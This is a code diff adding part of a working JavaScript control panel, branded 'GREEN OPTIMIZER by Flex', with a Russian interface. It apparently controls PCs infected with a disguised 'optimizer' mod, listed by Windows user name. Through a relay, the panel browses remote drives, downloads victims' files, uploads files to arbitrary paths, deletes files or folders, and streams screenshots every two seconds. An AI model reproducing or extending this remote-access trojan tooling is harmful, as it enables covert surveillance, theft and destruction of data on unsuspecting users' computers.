+      if (lines[0].indexOf('[FILES]|') === 0) {
+        var p = dec(lines[0].slice(8));
+        var es = lines.slice(1).filter(Boolean).map(function (l) {
+          var q = l.split('|');
+          return { dir: q[0] === 'D', name: dec(q[1]), size: parseInt(q[2], 10) || 0 };
+        });
+        renderEntries(p, es);
+        return;
+      }
+      window.print(text);
+    }).catch(function (e) {
+      window.print('[FAIL] files: ' + e.message, 'bad');
+      $('filesBody').innerHTML = '<div class="hint" style="color:#e33;padding:20px">ошибка: ' + esc(e.message) + '</div>';
+    });
+  }
+  function b64FromBytes(buf) {
+    var bytes = new Uint8Array(buf);
+    var bin = '';
+    var CH = 0x8000;
+    for (var i = 0; i < bytes.length; i += CH) {
+      bin += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + CH, bytes.length)));
+    }
+    return btoa(bin);
+  }
+  function saveBlob(name, b64) {
+    var chars = atob(b64.replace(/-/g, '+').replace(/_/g, '/'));
+    var arr = new Uint8Array(chars.length);
+    for (var i = 0; i < chars.length; i++) arr[i] = chars.charCodeAt(i);
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([arr]));
+    a.download = name;
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 2000);
+  }
+  function b64e(s) { return btoa(unescape(encodeURIComponent(s)))
+      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
+
+  window.downloadFile = function (path) {
+    if (!online) { window.print('[FAIL] нет канала', 'bad'); return; }
+    window.print('[..] скачиваю ' + path + ' ...', 'dim');
+    if (cfg.mode === 'local') {
+      localApi('read?path=' + encodeURIComponent(path)).then(function (j) {
+        if (!j.ok) throw new Error(j.error);
+        saveBlob(j.name, j.data);
+        window.print('[OK] скачано: ' + j.name + ' (' + j.size + ' байт)', 'ok');
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    } else {
+      relayCall('@read ' + path, 120000).then(function (text) {
+        if (text.indexOf('[DATA]|') === 0) {
+          var p = text.split('|');
+          saveBlob(dec(p[1]), p[2]);
+          window.print('[OK] скачано: ' + dec(p[1]), 'ok');
+        } else {
+          window.print(text);
+        }
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    }
+  };
+
+  window.pickUpload = function () { $('upl').click(); };
+  $('upl').addEventListener('change', function () {
+    var f = this.files[0];
+    this.value = '';
+    if (!f) return;
+    if (cfg.mode === 'relay' && !cfg.room) {
+      window.print('[FAIL] выбери клиента во вкладке «Подключения»', 'bad'); return;
+    }
+    if (!curPath && cfg.mode === 'relay') {
+      window.print('[FAIL] открой папку во вкладке Файлы', 'bad'); return;
+    }
+    var target = joinP(curPath || '', f.name);
+    window.print('[..] загружаю ' + f.name + ' (' + f.size + ' байт) -> ' + target + ' ...', 'dim');
+    var reader = new FileReader();
+    reader.onload = function () {
+      var data = b64FromBytes(reader.result);
+      if (cfg.mode === 'local') {
+        fetch(cfg.base.replace(/\/+$/, '') + '/api/write?key=' + encodeURIComponent(cfg.key), {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ path: target, data: data }).toString()
+        }).then(function (r) { return r.json(); }).then(function (j) {
+          if (!j.ok) throw new Error(j.error);
+          window.print('[OK] загружено ' + j.size + ' байт -> ' + target, 'ok');
+          if (curPath) filesGo(curPath);
+        }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+      } else {
+        relayCall('@write ' + b64e(target) + ' ' + data, 180000).then(function (t) {
+          window.print(t, t.indexOf('[OK]') === 0 ? 'ok' : 'bad');
+          if (curPath) filesGo(curPath);
+        }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+      }
+    };
+    reader.readAsArrayBuffer(f);
+  });
+
+  window.askDelete = function () {
+    if (cfg.mode === 'relay' && !cfg.room) { window.print('[FAIL] сначала выбери клиента во вкладке «Подключения»', 'bad'); return; }
+    var p = prompt('Путь к файлу или папке для удаления:', curPath || 'C:\\');
+    if (!p) return;
+    p = p.trim();
+    if (!p) return;
+    if (!confirm('Удалить: ' + p + ' ?')) return;
+    if (cfg.mode === 'local') {
+      fetch(cfg.base.replace(/\/+$/, '') + '/api/del?key=' + encodeURIComponent(cfg.key), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ path: p }).toString()
+      }).then(function (r) { return r.json(); }).then(function (j) {
+        window.print(j.ok ? ('[OK] ' + (j.message || 'удалено')) : ('[FAIL] ' + j.error), j.ok ? 'ok' : 'bad');
+        if (curPath) filesGo(curPath);
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    } else {
+      relayCall('@del ' + b64e(p), 30000).then(function (t) {
+        window.print(t, t.indexOf('[OK]') === 0 ? 'ok' : 'bad');
+        if (curPath) filesGo(curPath);
+      }).catch(function (e) { window.print('[FAIL] ' + e.message, 'bad'); });
+    }
+  };
+
+  /* ---------- screen ---------- */
+  var scrBusy = false;
+  function imgDataUrl(b64url) {
+    var s = b64url.replace(/-/g, '+').replace(/_/g, '/');
+    while (s.length % 4) s += '=';
+    return 'data:image/jpeg;base64,' + s;
+  }
+  window.requestScreen = function () {
+    if (scrBusy) return;
+    if (cfg.mode === 'relay' && !cfg.room) { window.print('[FAIL] сначала выбери клиента во вкладке «Подключения»', 'bad'); return; }
+    scrBusy = true;
+    $('scrInfo').textContent = 'захват...';
+    var finish = function (msg) { scrBusy = false; $('scrInfo').textContent = msg; };
+    if (cfg.mode === 'local') {
+      localApi('screen').then(function (j) {
+        if (!j.ok) throw new Error(j.error);
+        $('scr').src = 'data:image/jpeg;base64,' + j.img;
+        $('scrWrap').classList.add('live');
+        finish(new Date().toLocaleTimeString());
+      }).catch(function (e) { window.print('[FAIL] screen: ' + e.message, 'bad'); finish('ошибка'); });
+    } else {
+      relayCall('@screen', 20000).then(function (t) {
+        if (t.indexOf('[IMG]|') !== 0) { window.print(t, 'bad'); finish('ошибка'); return; }
+        $('scr').src = imgDataUrl(t.slice(6));
+        $('scrWrap').classList.add('live');
+        finish(new Date().toLocaleTimeString());
+      }).catch(function (e) { window.print('[FAIL] screen: ' + e.message, 'bad'); finish('ошибка'); });
+    }
+  };
+
+  function dec(s) {
+    try { return decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))); }
+    catch (e) { return s; }
+  }
+  window.loadDrives = function () { filesGo(''); };
+
+  /* ---------- boot ---------- */
+  print = window.print;
+  window.print('GREEN OPTIMIZER by Flex — панель управления');
+  window.print('вкладка «Подключения»: все ПК с модом (авто, имя = Windows user)\n');
+  ps1(); selText(); stubDrives();
+  $('mode').addEventListener('change', reconnect);
+  setInterval(poll, 3000);
+  setInterval(function () {
+    if (cfg.mode === 'relay' && online) pollRelay().catch(function () {});
+  }, 1500);
+  setInterval(function () {
+    if ($('v-screen').classList.contains('act') && $('scrAuto').checked && !scrBusy) requestScreen();
+  }, 2000);
+  reconnect();
+})();
+</script>
+</body>
+</html>
